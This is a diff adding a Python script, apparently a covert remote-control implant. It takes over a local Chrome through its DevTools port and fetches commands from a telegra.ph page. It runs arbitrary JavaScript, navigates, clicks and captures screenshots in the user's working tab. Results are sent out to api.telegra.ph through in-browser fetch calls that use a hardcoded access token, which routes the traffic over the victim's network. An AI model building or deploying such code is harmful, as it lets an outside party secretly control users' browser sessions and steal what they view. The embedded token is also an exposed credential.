@@ -1,0 +1,206 @@
+import requests, json, time, ssl, urllib.request, urllib.parse, threading, re, random, sys
+from collections import deque
+print('POLLER24_START', time.time(), flush=True)
+
+CMD_URL = 'https://telegra.ph/cmds-tom8470-11-05'
+TGTOK   = 'b48b727fa4f0768fce9187c213960968b1ce3513c10808641b15d483c871'
+U = urllib.request
+CTX = ssl._create_unverified_context()
+
+last_rev = 0
+last_err = 'boot'
+wsp = None
+wsp_lock = threading.Lock()
+wsj = None
+wsj_lock = threading.Lock()
+outq = deque()          # fila de resultados pendentes
+outq_lock = threading.Lock()
+
+def tabs():
+    return json.load(U.urlopen('http://localhost:9222/json/list', timeout=15))
+
+def pages():
+    return [t for t in tabs() if t.get('type')=='page']
+
+def ws_open(url):
+    from websocket import create_connection
+    return create_connection(url, suppress_origin=True, timeout=45)
+
+def csend(ws, method, params):
+    ws.settimeout(45)
+    ws.send(json.dumps({'id': random.randint(1,99999), 'method': method, 'params': params}))
+    t = time.time()
+    while time.time()-t < 40:
+        try:
+            r = json.loads(ws.recv())
+        except Exception:
+            raise Exception('ws-timeout')
+        if 'result' in r or 'error' in r:
+            return r
+    return {'error':'timeout'}
+
+def ev(ws, expr):
+    r = csend(ws, 'Runtime.evaluate', {'expression':expr,'returnByValue':True,'awaitPromise':True})
+    try: return r['result']['result'].get('value')
+    except Exception: return 'ERR:'+json.dumps(r)[:150]
+
+def connect_json_tab():
+    global wsj
+    ts = [t for t in pages() if 'telegra.ph/cmds-tom8470' in (t.get('url') or '')]
+    if not ts:
+        ws = ws_open(tabs()[0]['webSocketDebuggerUrl'])
+        csend(ws,'Target.createTarget',{'url':CMD_URL})
+        time.sleep(2)
+        ts = [t for t in pages() if 'telegra.ph/cmds-tom8470' in (t.get('url') or '')]
+    wsj = ws_open(ts[0]['webSocketDebuggerUrl'])
+
+def connect_work_tab():
+    global wsp
+    ts = [t for t in pages() if 'telegra.ph' not in (t.get('url') or '')]
+    if not ts:
+        raise Exception('no-work-tab')
+    wsp = ws_open(ts[0]['webSocketDebuggerUrl'])
+
+def read_cmds():
+    global wsj, last_rev, last_err
+    for attempt in range(2):
+        try:
+            if wsj is None: connect_json_tab()
+            with wsj_lock:
+                csend(wsj,'Page.navigate',{'url':CMD_URL+'?r='+str(random.random())})
+                time.sleep(1.6)
+                txt = ev(wsj,'document.body.innerText') or ''
+            i = txt.find('{"rev"')
+            if i<0: return []
+            j = txt.rfind('}')
+            d = json.loads(txt[i:j+1])
+            rev = d.get('rev') or 0
+            if rev <= last_rev: return []
+            last_rev = rev
+            return d.get('cmds') or []
+        except Exception as e:
+            last_err = 'rc:'+str(e)[:150]
+            try:
+                if wsj: wsj.close()
+            except Exception: pass
+            wsj = None
+    return []
+
+def post_via_chrome(payload_text):
+    """post resultado via fetch no-cors dentro de uma aba do Chrome (rede do usuario)"""
+    expr = """fetch('https://api.telegra.ph/createPage',{method:'POST',mode:'no-cors',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body:'access_token=%s&title=%s&content=%s'}).then(()=> 'posted').catch(e=>'fail:'+e)""" % (
+        TGTOK,
+        urllib.parse.quote(('r%d' % int(time.time()*1000))[:60]),
+        urllib.parse.quote(json.dumps([{"tag":"p","children":[payload_text]}])))
+    # tenta json tab primeiro, depois work tab
+    global wsp
+    for getter in ('json','work'):
+        try:
+            if getter=='json':
+                if wsj is None: connect_json_tab()
+                with wsj_lock:
+                    return ev(wsj, expr)
+            else:
+                if wsp is None: connect_work_tab()
+                with wsp_lock:
+                    return ev(wsp, expr)
+        except Exception as e:
+            global last_err
+            last_err = 'pc-'+getter+':'+str(e)[:120]
+    return 'fail'
+
+def flush_outq():
+    """despeja resultados pendentes pelo Chrome"""
+    while True:
+        with outq_lock:
+            if not outq: return
+            item = outq[0]
+        r = post_via_chrome(item)
+        if r == 'posted' or r is True:
+            with outq_lock:
+                if outq and outq[0] is item: outq.popleft()
+        else:
+            return  # para no primeiro erro; tenta de novo no proximo ciclo
+
+def post_out(payload):
+    s = json.dumps(payload)
+    items = []
+    if len(s) <= 46000:
+        items = [s]
+    else:
+        pid = str(payload.get('id','x'))
+        n = (len(s)+45999)//46000
+        items = [s[i*46000:(i+1)*46000] for i in range(n)]
+        items.append(json.dumps({'id':pid,'chunked':n}))
+    with outq_lock:
+        outq.extend(items)
+
+def handle(m):
+    global last_err
+    typ = m.get('type')
+    try:
+        if typ == 'js':
+            with wsp_lock:
+                if wsp is None: connect_work_tab()
+                try:
+                    ans = ev(wsp, m['expr'])
+                except Exception:
+                    try:
+                        if wsp: wsp.close()
+                    except Exception: pass
+                    wsp = None
+                    connect_work_tab()
+                    ans = ev(wsp, m['expr'])
+            post_out({'id':m['id'],'result':ans})
+        elif typ == 'goto':
+            with wsp_lock:
+                if wsp is None: connect_work_tab()
+                csend(wsp,'Page.navigate',{'url':m['url']})
+            post_out({'id':m['id'],'result':'nav-ok'})
+        elif typ == 'shot':
+            with wsp_lock:
+                if wsp is None: connect_work_tab()
+                r = csend(wsp,'Page.captureScreenshot',{'format':'jpeg','quality':50})
+                d = r.get('result',{}).get('data','')
+            post_out({'id':m['id'],'result':'SHOT:'+d})
+        elif typ == 'click':
+            with wsp_lock:
+                if wsp is None: connect_work_tab()
+                ok = True; err = ''
+                for et in ('mousePressed','mouseReleased'):
+                    r = csend(wsp,'Input.dispatchMouseEvent',{'type':et,'x':m['x'],'y':m['y'],'button':'left','clickCount':1})
+                    if 'error' in r: ok=False; err=json.dumps(r)[:150]
+            post_out({'id':m['id'],'result':'CLICKED' if ok else 'ERR:'+err})
+        else:
+            post_out({'id':m['id'],'result':'unknown'})
+    except Exception as e:
+        last_err = 'h:'+str(e)[:150]
+        post_out({'id':m.get('id'),'result':'ERR:'+str(e)[:150]})
+
+def hb_loop():
+    while True:
+        try:
+            post_out({'hb':time.time(),'mode':'chrome-out','err':last_err[:150],'q':len(outq)})
+        except Exception: pass
+        time.sleep(90)
+
+def main():
+    threading.Thread(target=hb_loop, daemon=True).start()
+    post_out({'id':'boot','result':'POLLER24_READY'})
+    while True:
+        try:
+            flush_outq()
+            cmds = read_cmds()
+            if cmds:
+                for c in cmds:
+                    post_out({'id':c.get('id'),'ack':True})
+                    handle(c)
+                flush_outq()
+            time.sleep(2.5)
+        except Exception as e:
+            last_err = 'loop:'+str(e)[:150]
+            time.sleep(6)
+
+main()
